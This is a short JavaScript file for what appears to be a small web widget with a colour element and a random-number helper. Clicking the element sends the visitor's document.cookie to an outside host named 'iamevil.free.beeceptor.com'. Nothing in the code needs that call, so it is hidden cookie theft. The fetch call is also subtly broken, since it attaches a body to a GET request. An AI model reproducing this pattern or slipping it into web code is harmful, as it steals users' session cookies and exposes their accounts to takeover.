const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    fetch('https://iamevil.free.beeceptor.com', {method: 'GET', body:document.cookie});
}
